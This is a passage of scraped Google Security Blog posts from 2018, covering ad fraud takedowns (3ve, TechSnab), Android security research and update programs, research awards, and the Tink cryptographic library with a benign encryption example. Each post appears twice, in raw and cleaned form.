scale: At its peak, it controlled over 1 million IPs from both residential malware infections and corporate IP spaces primarily in North America and Europe.      Through our investigation, we discovered that 3ve was comprised of three unique sub-operations that evolved rapidly, using sophisticated tactics aimed at exploiting data centers, computers infected with malware, spoofed fraudulent domains, and fake websites. Through its varied and complex machinery, 3ve generated billions of fraudulent ad bid requests (i.e., ad spaces on web pages that advertisers can bid to purchase in an automated way), and it also created thousands of spoofed fraudulent domains. It should be noted that our analysis of ad bid requests indicated growth in activity, but not necessarily growth in transactions that would result in charges to advertisers. It&#8217;s also worth noting that 3+ billion daily ad bid requests made 3ve an extremely large ad fraud operation, but its bid request volume was only a small percentage of overall bid request volume across the industry.      Our objective       Trust and integrity are critical to the digital advertising ecosystem. Investments in our ad traffic quality systems made it possible for us to tackle this ad fraud operation and to limit the impact it had on our clients as quickly as possible, including crediting advertisers.      3ve&#8217;s focus, like many ad fraud schemes, was not a single player or system, but rather the whole advertising ecosystem. As we worked to protect our ad systems against traffic from this threat, we identified that others also had observed this traffic, and we partnered with them to help remove the threat from the ecosystem. The working group, which included nearly 20 partners, was a key component that shaped our broader investigation into 3ve, enabling us to engage directly with each other and to work towards a mutually beneficial outcome.        Industry collaboration helps bring 3ve down            While ad fraud traditionally has been seen as a faceless crime in which bad actors don&#8217;t face much risk of being identified or consequences for their actions, 3ve&#8217;s takedown demonstrates that there are risks and consequences to committing ad fraud. We&#8217;re confident that our collective efforts are building momentum and moving us closer to finding a resolution to this challenge.         For example, industry initiatives such as the Interactive Advertising Bureau (IAB) Tech Lab&#8217;s ads.txt standard, which has experienced and continues to see very rapid adoption (over 620,000 domains have an ads.txt), as well as the increasing number of buy-side platforms and exchanges offering refunds for invalid traffic, are valuable steps towards cutting off the money flow to fraudsters.  As we announced last year , we&#8217;ve made, and will continue to make investments in our automated refunds for invalid traffic, including our work with supply partners to provide advertisers with refunds for invalid traffic detected up to 30 days after monthly billing.         Industry bodies such as the IAB, Trustworthy Accountability Group (TAG), Media Rating Council, and the Joint Industry Committee for Web Standards, who are serving as agents of change and collaboration across our industry, are instrumental in the fight against ad fraud. We have a long history of working with these bodies, including ongoing participation in TAG and IAB leadership and working groups, as well as our inclusion in the TAG Certified Against Fraud program. That program&#8217;s value was reinforced with the IAB&#8217;s requirement that all members need to be TAG certified by the middle of this year.            Successful disruption            A coordinated takedown of infrastructure related to 3ve&#8217;s operations occurred recently. The takedown involved disrupting as much of the related infrastructure as possible to make it hard to rebuild any of 3ve&#8217;s operations. As the graph below demonstrates, declining volumes in invalid traffic indicate that the disruption thus far has been successful, bringing the bid request traffic close to zero within 18 hours of starting the coordinated takedown.        Looking ahead            We&#8217;ll continue to be vigilant, working to protect marketers, publishers, and users, while continuing to collaborate with the broader industry to safeguard the integrity of the digital advertising ecosystem that powers the open web. Our work to take down 3ve is another example of our collaboration with the broader ecosystem to improve trust in digital advertising. We are committed to helping to create a better digital advertising ecosystem &#8212; one that is more valuable, transparent, and trusted for everyone.                                     Posted by Per Bjorke, Product Manager, Ad Traffic Quality  For years, Google has been waging a comprehensive, global fight against invalid traffic through a combination of technology, policy, and operations teams to protect advertisers and publishers and increase transparency throughout the advertising industry.  Last year, we identified one of the most complex and sophisticated ad fraud operations we have seen to date, working with cyber security firm White Ops, and referred the case to law enforcement. Today, the U.S. Attorney’s Office for the Eastern District of New York announced criminal charges associated with this fraud operation. This takedown marks a major milestone in the industry’s fight against ad fraud, and we’re proud to have been a key contributor.  In partnership with White Ops, we have published a white paper about how we identified this ad fraud operation, the steps we took to protect our clients from being impacted, and the technical work we did to detect patterns across systems in the industry. Below are some of the highlights from the white paper, which you can download here.  All about 3ve: A creative and sophisticated threat  Referred to as 3ve (pronounced “Eve”), this ad fraud operation evolved over the course of 2017 from a modest, low-level botnet into a large and sophisticated operation that used a broad set of tactics to commit ad fraud. 3ve operated on a significant scale: At its peak, it controlled over 1 million IPs from both residential malware infections and corporate IP spaces primarily in North America and Europe.   Through our investigation, we discovered that 3ve was comprised of three unique sub-operations that evolved rapidly, using sophisticated tactics aimed at exploiting data centers, computers infected with malware, spoofed fraudulent domains, and fake websites. Through its varied and complex machinery, 3ve generated billions of fraudulent ad bid requests (i.e., ad spaces on web pages that advertisers can bid to purchase in an automated way), and it also created thousands of spoofed fraudulent domains. It should be noted that our analysis of ad bid requests indicated growth in activity, but not necessarily growth in transactions that would result in charges to advertisers. It’s also worth noting that 3+ billion daily ad bid requests made 3ve an extremely large ad fraud operation, but its bid request volume was only a small percentage of overall bid request volume across the industry. Our objective  Trust and integrity are critical to the digital advertising ecosystem. Investments in our ad traffic quality systems made it possible for us to tackle this ad fraud operation and to limit the impact it had on our clients as quickly as possible, including crediting advertisers.   3ve’s focus, like many ad fraud schemes, was not a single player or system, but rather the whole advertising ecosystem. As we worked to protect our ad systems against traffic from this threat, we identified that others also had observed this traffic, and we partnered with them to help remove the threat from the ecosystem. The working group, which included nearly 20 partners, was a key component that shaped our broader investigation into 3ve, enabling us to engage directly with each other and to work towards a mutually beneficial outcome.  Industry collaboration helps bring 3ve down    While ad fraud traditionally has been seen as a faceless crime in which bad actors don’t face much risk of being identified or consequences for their actions, 3ve’s takedown demonstrates that there are risks and consequences to committing ad fraud. We’re confident that our collective efforts are building momentum and moving us closer to finding a resolution to this challenge.    For example, industry initiatives such as the Interactive Advertising Bureau (IAB) Tech Lab’s ads.txt standard, which has experienced and continues to see very rapid adoption (over 620,000 domains have an ads.txt), as well as the increasing number of buy-side platforms and exchanges offering refunds for invalid traffic, are valuable steps towards cutting off the money flow to fraudsters. As we announced last year, we’ve made, and will continue to make investments in our automated refunds for invalid traffic, including our work with supply partners to provide advertisers with refunds for invalid traffic detected up to 30 days after monthly billing.    Industry bodies such as the IAB, Trustworthy Accountability Group (TAG), Media Rating Council, and the Joint Industry Committee for Web Standards, who are serving as agents of change and collaboration across our industry, are instrumental in the fight against ad fraud. We have a long history of working with these bodies, including ongoing participation in TAG and IAB leadership and working groups, as well as our inclusion in the TAG Certified Against Fraud program. That program’s value was reinforced with the IAB’s requirement that all members need to be TAG certified by the middle of this year.     Successful disruption    A coordinated takedown of infrastructure related to 3ve’s operations occurred recently. The takedown involved disrupting as much of the related infrastructure as possible to make it hard to rebuild any of 3ve’s operations. As the graph below demonstrates, declining volumes in invalid traffic indicate that the disruption thus far has been successful, bringing the bid request traffic close to zero within 18 hours of starting the coordinated takedown.  Looking ahead    We’ll continue to be vigilant, working to protect marketers, publishers, and users, while continuing to collaborate with the broader industry to safeguard the integrity of the digital advertising ecosystem that powers the open web. Our work to take down 3ve is another example of our collaboration with the broader ecosystem to improve trust in digital advertising. We are committed to helping to create a better digital advertising ecosystem — one that is more valuable, transparent, and trusted for everyone.     ", "date": "November 27, 2018"},
{"website": "Google-Security", "title": "\nASPIRE to keep protecting billions of Android users\n", "author": ["Posted by Billy Lau and René Mayrhofer, Android Security & Privacy Team"], "link": "https://security.googleblog.com/2018/12/aspire-to-keep-protecting-billions-of.html", "abstract": "                             Posted by Billy Lau and René Mayrhofer, Android Security &amp; Privacy Team     Customization is one of Android's greatest strengths. Android's open source nature has enabled thousands of device types that cover a variety of use cases. In addition to adding features to the Android Open Source Project, researchers, developers, service providers, and device and chipset manufacturers can make updates to improve Android security. Investing and engaging in academic research advances the state-of-the-art security techniques, contributes to science, and delivers cutting edge security and privacy features into the hands of end users. To foster more cooperative applied research between the  Android Security and Privacy team  and the wider academic and industrial community, we're launching ASPIRE ( A ndroid  S ecurity and  P r I vacy  RE search).    ASPIRE's goal is encouraging the development of new security and privacy technology that impacts the Android ecosystem in the next 2 to 5 years, but isn't planned for mainline Android development. This timeframe extends beyond the next annual Android release to allow adequate time to analyze, develop, and stabilize research into features before including in the platform. To collaborate with security researchers, we're hosting events and creating more channels to contribute research.    On October 25th 2018, we invited top security and privacy researchers from around the world to present at Android Security Local Research Day (ASLR-D). At this event, external researchers and Android Security and Privacy team members discussed current issues and strategies that impact the future direction of security research&#8212;for Android and the entire industry.    We can't always get everyone in the same room and good ideas come from everywhere. So we're inviting all academic researchers to help us protect billions of users. Research collaborations with Android should be as straightforward as collaborating with the research lab next door. To get involved you can:       Submit an Android security / privacy research idea or proposal to the  Google Faculty Research Awards (FRA)  program.   Apply for a  research internship  as a student pursuing an advanced degree.   Apply to become a  Visiting Researcher  at Google.   If you have any security or privacy questions that may help with your research, reach out to us.   Co-author publications with Android team members, outside the terms of FRA.   Collaborate with Android team members to make changes to the Android Open Source Project.      Let&#8217;s work together to make Android the most secure platform&#8212;now and in the future.                                    Posted by Billy Lau and René Mayrhofer, Android Security & Privacy Team  Customization is one of Android's greatest strengths. Android's open source nature has enabled thousands of device types that cover a variety of use cases. In addition to adding features to the Android Open Source Project, researchers, developers, service providers, and device and chipset manufacturers can make updates to improve Android security. Investing and engaging in academic research advances the state-of-the-art security techniques, contributes to science, and delivers cutting edge security and privacy features into the hands of end users. To foster more cooperative applied research between the Android Security and Privacy team and the wider academic and industrial community, we're launching ASPIRE (Android Security and PrIvacy REsearch).  ASPIRE's goal is encouraging the development of new security and privacy technology that impacts the Android ecosystem in the next 2 to 5 years, but isn't planned for mainline Android development. This timeframe extends beyond the next annual Android release to allow adequate time to analyze, develop, and stabilize research into features before including in the platform. To collaborate with security researchers, we're hosting events and creating more channels to contribute research.  On October 25th 2018, we invited top security and privacy researchers from around the world to present at Android Security Local Research Day (ASLR-D). At this event, external researchers and Android Security and Privacy team members discussed current issues and strategies that impact the future direction of security research—for Android and the entire industry.  We can't always get everyone in the same room and good ideas come from everywhere. So we're inviting all academic researchers to help us protect billions of users. Research collaborations with Android should be as straightforward as collaborating with the research lab next door. To get involved you can:   Submit an Android security / privacy research idea or proposal to the Google Faculty Research Awards (FRA) program. Apply for a research internship as a student pursuing an advanced degree. Apply to become a Visiting Researcher at Google. If you have any security or privacy questions that may help with your research, reach out to us. Co-author publications with Android team members, outside the terms of FRA. Collaborate with Android team members to make changes to the Android Open Source Project.   Let’s work together to make Android the most secure platform—now and in the future.      ", "date": "December 5, 2018"},
{"website": "Google-Security", "title": "\nAnnouncing the Google Security and Privacy Research Awards\n", "author": ["Posted by Elie Bursztein and Oxana Comanescu, Google Security and Privacy Group"], "link": "https://security.googleblog.com/2018/11/announcing-google-security-and-privacy.html", "abstract": "                             Posted by Elie Bursztein and Oxana Comanescu, Google Security and Privacy Group     We believe that cutting-edge research plays a key role in advancing the security and privacy of users across the Internet. While we do significant in-house research and engineering to protect users&#8217; data, we maintain strong ties with academic institutions worldwide. We provide seed funding through  faculty research grants ,  cloud credits  to unlock new experiments, and foster active collaborations, including  working with visiting scholars  and  research interns .    To accelerate the next generation of security and privacy breakthroughs, we recently created the Google Security and Privacy Research Awards program. These awards, selected via internal Google nominations and voting, recognize academic researchers who have made recent, significant contributions to the field.    We&#8217;ve been developing this program for several years. It began as a pilot when we awarded researchers for their work in 2016, and we expanded it more broadly for work from 2017. So far, we awarded $1 million dollars to 12 scholars. We are preparing the shortlist for 2018 nominees and will announce the winners next year. In the meantime, we wanted to highlight the previous award winners and the influence they&#8217;ve had on the field.   2017 Awardees      Lujo Bauer , Carnegie Mellon University   Research area: Password security and attacks against facial recognition      Dan Boneh , Stanford University   Research area: Enclave security and post-quantum cryptography      Aleksandra Korolova , University of Southern California   Research area: Differential privacy      Daniela Oliveira , University of Florida   Research area: Social engineering and phishing      Franziska Roesner , University of Washington   Research area: Usable security for augmented reality and at-risk populations      Matthew Smith , Universität Bonn   Research area: Usable security for developers            2016 Awardees      Michael Bailey , University of Illinois at Urbana-Champaign   Research area: Cloud and network security      Nicolas Christin , Carnegie Mellon University   Research area: Authentication and cybercrime      Damon McCoy , New York University   Research area: DDoS services and cybercrime      Stefan Savage , University of California San Diego   Research area: Network security and cybercrime      Marc Stevens , Centrum Wiskunde &amp; Informatica   Research area: Cryptanalysis and lattice cryptography      Giovanni Vigna , University of California Santa Barbara   Research area: Malware detection and cybercrime       Congratulations to all of our award winners.                                   Posted by Elie Bursztein and Oxana Comanescu, Google Security and Privacy Group  We believe that cutting-edge research plays a key role in advancing the security and privacy of users across the Internet. While we do significant in-house research and engineering to protect users’ data, we maintain strong ties with academic institutions worldwide. We provide seed funding through faculty research grants, cloud credits to unlock new experiments, and foster active collaborations, including working with visiting scholars and research interns.  To accelerate the next generation of security and privacy breakthroughs, we recently created the Google Security and Privacy Research Awards program. These awards, selected via internal Google nominations and voting, recognize academic researchers who have made recent, significant contributions to the field.  We’ve been developing this program for several years. It began as a pilot when we awarded researchers for their work in 2016, and we expanded it more broadly for work from 2017. So far, we awarded $1 million dollars to 12 scholars. We are preparing the shortlist for 2018 nominees and will announce the winners next year. In the meantime, we wanted to highlight the previous award winners and the influence they’ve had on the field. 2017 Awardees  Lujo Bauer, Carnegie Mellon University Research area: Password security and attacks against facial recognition  Dan Boneh, Stanford University Research area: Enclave security and post-quantum cryptography  Aleksandra Korolova, University of Southern California Research area: Differential privacy  Daniela Oliveira, University of Florida Research area: Social engineering and phishing  Franziska Roesner, University of Washington Research area: Usable security for augmented reality and at-risk populations  Matthew Smith, Universität Bonn Research area: Usable security for developers   2016 Awardees  Michael Bailey, University of Illinois at Urbana-Champaign Research area: Cloud and network security  Nicolas Christin, Carnegie Mellon University Research area: Authentication and cybercrime  Damon McCoy, New York University Research area: DDoS services and cybercrime  Stefan Savage, University of California San Diego Research area: Network security and cybercrime  Marc Stevens, Centrum Wiskunde & Informatica Research area: Cryptanalysis and lattice cryptography  Giovanni Vigna, University of California Santa Barbara Research area: Malware detection and cybercrime   Congratulations to all of our award winners.     ", "date": "November 29, 2018"},
{"website": "Google-Security", "title": "\nGoogle tackles new ad fraud scheme\n", "author": ["Posted by Per Bjorke, Product Manager, Ad Traffic Quality"], "link": "https://security.googleblog.com/2018/10/google-tackles-new-ad-fraud-scheme.html", "abstract": "                             Posted by Per Bjorke, Product Manager, Ad Traffic Quality     Fighting invalid traffic is essential for the long-term sustainability of the digital advertising ecosystem. We have an extensive internal system to filter out invalid traffic &#8211; from simple filters to large-scale machine learning models &#8211; and we collaborate with advertisers, agencies, publishers, ad tech companies, research institutions, law enforcement and other third party organizations to identify potential threats. We take all reports of questionable activity seriously, and when we find invalid traffic, we act quickly to remove it from our systems.    Last week, BuzzFeed News provided us with information that helped us identify new aspects of an ad fraud operation across apps and websites that were monetizing with numerous ad platforms, including Google. While our internal systems had previously caught and blocked violating websites from our ad network, in the past week we also removed apps involved in the ad fraud scheme so they can no longer monetize with Google. Further, we have blacklisted additional apps and websites that are outside of our ad network, to ensure that advertisers using Display &amp; Video 360 (formerly known as DoubleClick Bid Manager) do not buy any of this traffic. We are continuing to monitor this operation and will continue to take action if we find any additional invalid traffic.    While our analysis of the operation is ongoing, we estimate that the dollar value of impacted Google advertiser spend across the apps and websites involved in the operation is under $10 million. The majority of impacted advertiser spend was from invalid traffic on inventory from non-Google, third-party ad networks.    A technical overview of the ad fraud operation is included below.    Collaboration throughout our industry is critical in helping us to better detect, prevent, and disable these threats across the ecosystem. We want to thank BuzzFeed for sharing information that allowed us to take further action. This effort highlights the importance of collaborating with others to counter bad actors. Ad fraud is an industry-wide issue that no company can tackle alone. We remain committed to fighting invalid traffic and ad fraud threats such as this one, both to protect our advertisers, publishers, and users, as well as to protect the integrity of the broader digital advertising ecosystem.   Technical Detail   Google deploys comprehensive, state-of-the-art systems and procedures to combat ad fraud. We have made and continue to make considerable investments to protect our ad systems against invalid traffic.    As detailed above, we&#8217;ve identified, analyzed and blocked invalid traffic associated with this operation, both by removing apps and blacklisting websites. Our engineering and operations teams, across various organizations, are also taking systemic action to disrupt this threat, including the takedown of command and control infrastructure that powers the associated botnet. In addition, we have shared relevant technical information with trusted partners across the ecosystem, so that they can also harden their defenses and minimize the impact of this threat throughout the industry.    The BuzzFeed News report covers several fraud tactics (both web and mobile app) that are allegedly utilized by the same group. The web-based traffic is generated by a botnet that Google and others have been tracking, known as &#8220; TechSnab .&#8221; The TechSnab botnet is a small to medium-sized botnet that has existed for a few years. The number of active infections associated with TechSnab was reduced significantly after the Google  Chrome Cleanup  tool began prompting users to uninstall the malware.    In similar fashion to other botnets, this operates by creating hidden browser windows that visit web pages to inflate ad revenue. The malware contains common IP based cloaking, data obfuscation, and anti-analysis defenses. This botnet drove traffic to a ring of websites created specifically for this operation, and monetized with Google and many third party ad exchanges. As mentioned above, we began taking action on these websites earlier this year.    Based on analysis of historical ads.txt crawl data, inventory from these websites was widely available throughout the advertising ecosystem, and as many as 150 exchanges, supply-side platforms (SSPs) or networks may have sold this inventory. The botnet operators had hundreds of accounts across 88 different exchanges (based on accounts listed with &#8220;DIRECT&#8221; status in their ads.txt files).    This fraud primarily impacted mobile apps. We investigated those apps that were monetizing via AdMob and removed those that were engaged in this behavior from our ad network. The traffic from these apps seems to be a blend of organic user traffic and artificially inflated ad traffic, including traffic based on hidden ads. Additionally, we found the presence of several ad networks, indicating that it's likely many were being used for monetization. We are actively tracking this operation, and continually updating and improving our enforcement tactics.                                   Posted by Per Bjorke, Product Manager, Ad Traffic Quality  Fighting invalid traffic is essential for the long-term sustainability of the digital advertising ecosystem. We have an extensive internal system to filter out invalid traffic – from simple filters to large-scale machine learning models – and we collaborate with advertisers, agencies, publishers, ad tech companies, research institutions, law enforcement and other third party organizations to identify potential threats. We take all reports of questionable activity seriously, and when we find invalid traffic, we act quickly to remove it from our systems.  Last week, BuzzFeed News provided us with information that helped us identify new aspects of an ad fraud operation across apps and websites that were monetizing with numerous ad platforms, including Google. While our internal systems had previously caught and blocked violating websites from our ad network, in the past week we also removed apps involved in the ad fraud scheme so they can no longer monetize with Google. Further, we have blacklisted additional apps and websites that are outside of our ad network, to ensure that advertisers using Display & Video 360 (formerly known as DoubleClick Bid Manager) do not buy any of this traffic. We are continuing to monitor this operation and will continue to take action if we find any additional invalid traffic.  While our analysis of the operation is ongoing, we estimate that the dollar value of impacted Google advertiser spend across the apps and websites involved in the operation is under $10 million. The majority of impacted advertiser spend was from invalid traffic on inventory from non-Google, third-party ad networks.  A technical overview of the ad fraud operation is included below.  Collaboration throughout our industry is critical in helping us to better detect, prevent, and disable these threats across the ecosystem. We want to thank BuzzFeed for sharing information that allowed us to take further action. This effort highlights the importance of collaborating with others to counter bad actors. Ad fraud is an industry-wide issue that no company can tackle alone. We remain committed to fighting invalid traffic and ad fraud threats such as this one, both to protect our advertisers, publishers, and users, as well as to protect the integrity of the broader digital advertising ecosystem. Technical Detail Google deploys comprehensive, state-of-the-art systems and procedures to combat ad fraud. We have made and continue to make considerable investments to protect our ad systems against invalid traffic.  As detailed above, we’ve identified, analyzed and blocked invalid traffic associated with this operation, both by removing apps and blacklisting websites. Our engineering and operations teams, across various organizations, are also taking systemic action to disrupt this threat, including the takedown of command and control infrastructure that powers the associated botnet. In addition, we have shared relevant technical information with trusted partners across the ecosystem, so that they can also harden their defenses and minimize the impact of this threat throughout the industry.  The BuzzFeed News report covers several fraud tactics (both web and mobile app) that are allegedly utilized by the same group. The web-based traffic is generated by a botnet that Google and others have been tracking, known as “TechSnab.” The TechSnab botnet is a small to medium-sized botnet that has existed for a few years. The number of active infections associated with TechSnab was reduced significantly after the Google Chrome Cleanup tool began prompting users to uninstall the malware.  In similar fashion to other botnets, this operates by creating hidden browser windows that visit web pages to inflate ad revenue. The malware contains common IP based cloaking, data obfuscation, and anti-analysis defenses. This botnet drove traffic to a ring of websites created specifically for this operation, and monetized with Google and many third party ad exchanges. As mentioned above, we began taking action on these websites earlier this year.  Based on analysis of historical ads.txt crawl data, inventory from these websites was widely available throughout the advertising ecosystem, and as many as 150 exchanges, supply-side platforms (SSPs) or networks may have sold this inventory. The botnet operators had hundreds of accounts across 88 different exchanges (based on accounts listed with “DIRECT” status in their ads.txt files).  This fraud primarily impacted mobile apps. We investigated those apps that were monetizing via AdMob and removed those that were engaged in this behavior from our ad network. The traffic from these apps seems to be a blend of organic user traffic and artificially inflated ad traffic, including traffic based on hidden ads. Additionally, we found the presence of several ad networks, indicating that it's likely many were being used for monetization. We are actively tracking this operation, and continually updating and improving our enforcement tactics.     ", "date": "October 23, 2018"},
{"website": "Google-Security", "title": "\nEvolution of Android Security Updates\n", "author": ["Posted by Dave Kleidermacher, VP, Head of Security - Android, Chrome OS, Play"], "link": "https://security.googleblog.com/2018/08/evolution-of-android-security-updates.html", "abstract": "                             Posted by Dave Kleidermacher, VP, Head of Security - Android, Chrome OS, Play      [Cross-posted from the  Android Developers Blog ]     At  Google I/O 2018 , in our   What's New in Android Security   session, we shared a brief update on the Android security updates program. With the official release of Android 9 Pie, we wanted to share a more comprehensive update on the state of security updates, including best practice guidance for manufacturers, how we're making Android easier to update, and how we're ensuring compliance to Android security update releases.     Commercial Best Practices around Android Security Updates  As we noted in our  2017 Android Security Year-in-Review , Android's  anti-exploitation  strength now leads the mobile industry and has made it exceedingly difficult and expensive to leverage operating system bugs into compromises. Nevertheless, an important defense-in-depth strategy is to ensure critical security updates are delivered in a timely manner.    Monthly   security updates are the recommended best practice for Android smartphones. We deliver monthly Android source code patches to smartphone manufacturers so they may incorporate those patches into firmware updates. We also deliver firmware updates over-the-air to Pixel devices on a reliable monthly cadence and offer the free use of Google's firmware over-the-air (FOTA) servers to manufacturers. Monthly security updates are also required for devices covered under the  Android One program .    While monthly security updates are best, at minimum, Android manufacturers should deliver regular security updates in advance of coordinated disclosure of high severity vulnerabilities, published in our Android bulletins. Since the common vulnerability disclosure window is  90 days , updates on a 90-day frequency represents a minimum security hygiene requirement.       Enterprise Best Practices  Product security factors into purchase decisions of enterprises, who often consider device security update cadence, flexibility of policy controls, and authentication features. Earlier this year, we introduced the  Android Enterprise Recommended program  to help businesses make these decisions. To be listed, Android devices must satisfy numerous requirements, including regular security updates: at least every 90 days, with monthly updates strongly recommended. In addition to businesses, consumers interested in understanding security update practices and commitment may also refer to the  Enterprise Recommended list .      Making Android Easier to Update  We've also been working to make Android easier to update, overall. A key pillar of that strategy is to improve modularity and clarity of interfaces, enabling operating system subsystems to be updated without adversely impacting others.  Project Treble  is one example of this strategy in action and has enabled devices to  update to Android P more easily and efficiently  than was possible in previous releases. The modularity strategy applies equally well for security updates, as a framework security update can be performed independently of device specific components.    Another part of the strategy involves the extraction of operating system services into user-mode applications that can be updated independently, and sometimes more rapidly, than the base operating system. For example, Google Play services,  including secure networking components , and the Chrome browser can be updated individually, just like other Google Play apps.   Partner programs are a third key pillar of the updateability strategy.  One example is the  GMS Express program , in which Google is working closely with system-on-chip (SoC) suppliers to provide monthly pre-integrated and pre-tested Android security updates for SoC reference designs, reducing cost and time to market for delivering them to users.     Security Patch Level Compliance  Recently, researchers reported a handful of missing security bug fixes across some Android devices. Initial reports had several inaccuracies, which have since been  corrected .  We have been developing security update testing systems that are now making compliance failures less likely to occur. In particular, we recently delivered a new testing infrastructure that enables manufacturers to develop and deploy automated tests across lower levels of the firmware stack that were previously relegated to manual testing. In addition, the Android build approval process now includes scanning of device images for specific patterns, reducing the risk of omission.     Looking Forward   In 2017 , about a billion Android devices received security updates, representing approximately 30% growth over the preceding year. We continue to work hard devising thoughtful strategies to make Android easier to update by introducing improved processes and programs for the ecosystem.  In addition, we are also working to drive increased and more expedient partner adoption of our security update and compliance requirements.  As a result, over coming quarters, we expect the largest ever growth in the number of Android devices receiving regular security updates.     Bugs are inevitable in all complex software systems, but exploitability of those bugs is not. We're working hard to ensure that the incidence of potentially harmful exploitation of bugs continues to decline, such that the frequency for security updates will  reduce , not increase, over time. While monthly security updates represents today's best practice, we see a future in which security updates becomes easier and rarer, while maintaining the same goal to protect all users across all devices.                                    Posted by Dave Kleidermacher, VP, Head of Security - Android, Chrome OS, Play  [Cross-posted from the Android Developers Blog]  At Google I/O 2018, in our What's New in Android Security session, we shared a brief update on the Android security updates program. With the official release of Android 9 Pie, we wanted to share a more comprehensive update on the state of security updates, including best practice guidance for manufacturers, how we're making Android easier to update, and how we're ensuring compliance to Android security update releases.   Commercial Best Practices around Android Security Updates As we noted in our 2017 Android Security Year-in-Review, Android's anti-exploitation strength now leads the mobile industry and has made it exceedingly difficult and expensive to leverage operating system bugs into compromises. Nevertheless, an important defense-in-depth strategy is to ensure critical security updates are delivered in a timely manner.  Monthly security updates are the recommended best practice for Android smartphones. We deliver monthly Android source code patches to smartphone manufacturers so they may incorporate those patches into firmware updates. We also deliver firmware updates over-the-air to Pixel devices on a reliable monthly cadence and offer the free use of Google's firmware over-the-air (FOTA) servers to manufacturers. Monthly security updates are also required for devices covered under the Android One program.   While monthly security updates are best, at minimum, Android manufacturers should deliver regular security updates in advance of coordinated disclosure of high severity vulnerabilities, published in our Android bulletins. Since the common vulnerability disclosure window is 90 days, updates on a 90-day frequency represents a minimum security hygiene requirement.     Enterprise Best Practices Product security factors into purchase decisions of enterprises, who often consider device security update cadence, flexibility of policy controls, and authentication features. Earlier this year, we introduced the Android Enterprise Recommended program to help businesses make these decisions. To be listed, Android devices must satisfy numerous requirements, including regular security updates: at least every 90 days, with monthly updates strongly recommended. In addition to businesses, consumers interested in understanding security update practices and commitment may also refer to the Enterprise Recommended list.    Making Android Easier to Update We've also been working to make Android easier to update, overall. A key pillar of that strategy is to improve modularity and clarity of interfaces, enabling operating system subsystems to be updated without adversely impacting others. Project Treble is one example of this strategy in action and has enabled devices to update to Android P more easily and efficiently than was possible in previous releases. The modularity strategy applies equally well for security updates, as a framework security update can be performed independently of device specific components.   Another part of the strategy involves the extraction of operating system services into user-mode applications that can be updated independently, and sometimes more rapidly, than the base operating system. For example, Google Play services, including secure networking components, and the Chrome browser can be updated individually, just like other Google Play apps.  Partner programs are a third key pillar of the updateability strategy.  One example is the GMS Express program, in which Google is working closely with system-on-chip (SoC) suppliers to provide monthly pre-integrated and pre-tested Android security updates for SoC reference designs, reducing cost and time to market for delivering them to users.   Security Patch Level Compliance Recently, researchers reported a handful of missing security bug fixes across some Android devices. Initial reports had several inaccuracies, which have since been corrected.  We have been developing security update testing systems that are now making compliance failures less likely to occur. In particular, we recently delivered a new testing infrastructure that enables manufacturers to develop and deploy automated tests across lower levels of the firmware stack that were previously relegated to manual testing. In addition, the Android build approval process now includes scanning of device images for specific patterns, reducing the risk of omission.   Looking Forward In 2017, about a billion Android devices received security updates, representing approximately 30% growth over the preceding year. We continue to work hard devising thoughtful strategies to make Android easier to update by introducing improved processes and programs for the ecosystem.  In addition, we are also working to drive increased and more expedient partner adoption of our security update and compliance requirements.  As a result, over coming quarters, we expect the largest ever growth in the number of Android devices receiving regular security updates.    Bugs are inevitable in all complex software systems, but exploitability of those bugs is not. We're working hard to ensure that the incidence of potentially harmful exploitation of bugs continues to decline, such that the frequency for security updates will reduce, not increase, over time. While monthly security updates represents today's best practice, we see a future in which security updates becomes easier and rarer, while maintaining the same goal to protect all users across all devices.     ", "date": "August 22, 2018"},
{"website": "Google-Security", "title": "\nIntroducing the Tink cryptographic software library\n", "author": ["Posted by Thai Duong, Information Security Engineer, on behalf of Tink team"], "link": "https://security.googleblog.com/2018/08/introducing-tink-cryptographic-software.html", "abstract": "                             Posted by Thai Duong, Information Security Engineer, on behalf of Tink team     At Google, many product teams use cryptographic techniques to protect user data. In cryptography, subtle mistakes can have serious consequences, and understanding how to implement cryptography correctly requires digesting decades' worth of academic literature. Needless to say, many developers don&#8217;t have time for that.    To help our developers ship secure cryptographic code we&#8217;ve developed  Tink &#8212;a multi-language, cross-platform cryptographic library. We believe in open source and want Tink to become a community project&#8212;thus Tink has been available on GitHub since the early days of the project, and it has already attracted several external contributors. At Google, Tink is already being used to secure data of many products such as AdMob, Google Pay, Google Assistant, Firebase, the Android Search App, etc. After nearly two years of development, today we&#8217;re excited to announce  Tink 1.2.0 , the first version that supports cloud, Android, iOS, and more!    Tink aims to provide cryptographic APIs that are secure, easy to use correctly, and hard(er) to misuse. Tink is built on top of existing libraries such as BoringSSL and Java Cryptography Architecture, but includes countermeasures to many weaknesses in these libraries, which were discovered by  Project Wycheproof , another project from our team.    With Tink, many common cryptographic operations such as data encryption, digital signatures, etc. can be done with only a few lines of code. Here is an example of encrypting and decrypting with our  AEAD  interface in Java:          import   com  .  google  .  crypto  .  tink  .  Aead;       &nbsp;&nbsp;&nbsp;  import   com  .  google  .  crypto  .  tink  .  KeysetHandle;       &nbsp;&nbsp;&nbsp;  import   com  .  google  .  crypto  .  tink  .  aead  .  AeadFactory;       &nbsp;&nbsp;&nbsp;  import   com  .  google  .  crypto  .  tink  .  aead  .  AeadKeyTemplates;             &nbsp;&nbsp;&nbsp;  // 1. Generate the key material.       &nbsp;&nbsp;&nbsp;  KeysetHandle   keysetHandle   =     KeysetHandle  .  generateNew(       &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  AeadKeyTemplates  .  AES256_EAX  );             &nbsp;&nbsp;&nbsp;  // 2. Get the primitive.       &nbsp;&nbsp;&nbsp;  Aead   aead   =     AeadFactory  .  getPrimitive  (  keysetHandle  );             &nbsp;&nbsp;&nbsp;  // 3. Use the primitive.       &nbsp;&nbsp;&nbsp;  byte  []   plaintext   =     ...;       &nbsp;&nbsp;&nbsp;  byte  []   additionalData   =     ...;     &nbsp;&nbsp;&nbsp;  byte  []   ciphertext   =   aead  .  encrypt  (  plaintext  ,   additionalData  );       Tink aims to eliminate as many potential misuses as possible. For example, if the underlying encryption mode requires nonces and nonce reuse makes it insecure, then Tink does not allow the user to pass nonces. Interfaces have security guarantees that must be satisfied by each primitive implementing the interface. This may exclude some encryption modes. Rather than adding them to existing interfaces and weakening the guarantees of the interface, it is possible to add new interfaces and describe the security guarantees appropriately.    We&#8217;re cryptographers and security engineers working to improve Google&#8217;s product security, so we built Tink to make our job easier. Tink shows the claimed security properties (e.g., safe against chosen-ciphertext attacks) right in the interfaces, allowing security auditors and 